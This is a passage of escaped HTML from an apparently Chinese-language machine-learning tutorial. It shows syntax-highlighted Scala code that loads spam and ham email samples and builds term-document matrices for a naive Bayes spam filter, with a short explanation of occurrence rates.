&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;easyHam2Path&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/easy_ham_2&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061341372596984-7&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061341372596984-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;amountOfSamplesPerSet&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;500&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061341372596984-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;amountOfFeaturesToTake&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;100&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061341372596984-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//First get a subset of the filenames for the spam &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061341372596984-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// sample set (500 is the complete set in this case)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061341372596984-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//首先取出一个包含文件名的子集作为垃圾邮件样本集（在这个案例中，全集是500个文件名）&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061341372596984-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;listOfSpamFiles&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getFilesFromDir&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;spamPath&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061341372596984-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;take&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;amountOfSamplesPerSet&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061341372596984-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Then get the messages that are contained in these files&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061341372596984-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//然后取得包含在这些文件中的信息&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061341372596984-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;spamMails&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;listOfSpamFiles&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getMessage&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061341372596984-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061341372596984-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Get a subset of the filenames from the ham sample set&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061341372596984-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//取出一个文件名子集作为正常邮件样本集&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061341372596984-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// (note that in this case it is not necessary to randomly&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061341372596984-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// sample as the emails are already randomly ordered)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061341372596984-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//（注意在本案例中没有必要随机取样，因为这些邮件已经是随机排序）&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061341372596984-24&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061341372596984-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;listOfHamFiles&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getFilesFromDir&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;easyHamPath&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061341372596984-26&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;take&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;amountOfSamplesPerSet&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061341372596984-27&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Get the messages that are contained in the ham files&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061341372596984-28&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//取得包含在正常邮件中的信息&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061341372596984-29&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;hamMails&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;listOfHamFiles&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061341372596984-30&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getMessage&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061341372596984-31&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0039 seconds] --&gt;
&lt;p&gt;既然我们已经获取了正常邮件和垃圾邮件的训练数据，就可以开始建立两个 &lt;a href=&quot;http://en.wikipedia.org/wiki/Document-term_matrix&quot;&gt;TDM&lt;/a&gt; 了。不过在给出实现这个过程的代码之前，我们首先简短解释下这么做的原因。TDM 包含了&lt;strong&gt;所有&lt;/strong&gt;出现在训练集正文中的单词，以及词频。然而，词频可能不是最好的量度方法（比如，一封含有 1000000 个“cake”的邮件就能把整个表搞砸），因此我们也会计算&lt;strong&gt;出现率&lt;/strong&gt;，也就是，包含那个特定词汇的文档数量。现在我们开始生成两个 TDM。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d061345156763992&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
 val spamTDM  = spamMails
      .flatMap(email =&amp;gt; email
        ._2.split(&quot; &quot;)
        .filter(word =&amp;gt; word.nonEmpty)
        .map(word =&amp;gt; (email._1.getName,word)))
        .groupBy(x =&amp;gt; x._2)
        .map(x =&amp;gt; (x._1, x._2.groupBy(x =&amp;gt; x._1)))
        .map(x =&amp;gt; (x._1, x._2.map( y =&amp;gt; (y._1, y._2.length))))
        .toList

    //Sort the words by occurrence rate descending 
    //以出现率降序排列这些单词
    //(amount of times the word occurs among all documents)
    //（该单词在所有文档中出现的总次数）
  val sortedSpamTDM = spamTDM
    .sortBy(x =&amp;gt;  - (x._2.size.toDouble / spamMails.length))

  val hamTDM  = hamMails
      .flatMap(email =&amp;gt; email
      ._2.split(&quot; &quot;)
      .filter(word =&amp;gt; word.nonEmpty)
      .map(word =&amp;gt; (email._1.getName,word)))
      .groupBy(x =&amp;gt; x._2)
      .map(x =&amp;gt; (x._1, x._2.groupBy(x =&amp;gt; x._1)))
      .map(x =&amp;gt; (x._1, x._2.map( y =&amp;gt; (y._1, y._2.length))))
      .toList

    //Sort the words by occurrence rate  descending 
    //以出现率降序排列这些单词
    //(amount of times the word occurs among all documents)
    //（该单词在所有文档中出现的总次数）
    val sortedHamTDM = hamTDM
        .sortBy(x =&amp;gt;  - (x._2.size.toDouble / spamMails.length))&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061345156763992-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061345156763992-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061345156763992-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061345156763992-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061345156763992-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061345156763992-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061345156763992-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061345156763992-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061345156763992-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061345156763992-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061345156763992-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061345156763992-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061345156763992-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061345156763992-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061345156763992-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061345156763992-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061345156763992-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061345156763992-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061345156763992-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061345156763992-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061345156763992-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061345156763992-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061345156763992-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061345156763992-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061345156763992-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061345156763992-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061345156763992-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061345156763992-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061345156763992-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061345156763992-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061345156763992-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061345156763992-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061345156763992-33&quot;&gt;33&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061345156763992-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;spamTDM&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;spamMails&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061345156763992-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;flatMap&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;email&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061345156763992-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061345156763992-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;nonEmpty&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061345156763992-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061345156763992-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;groupBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061345156763992-7&quot;&gt;
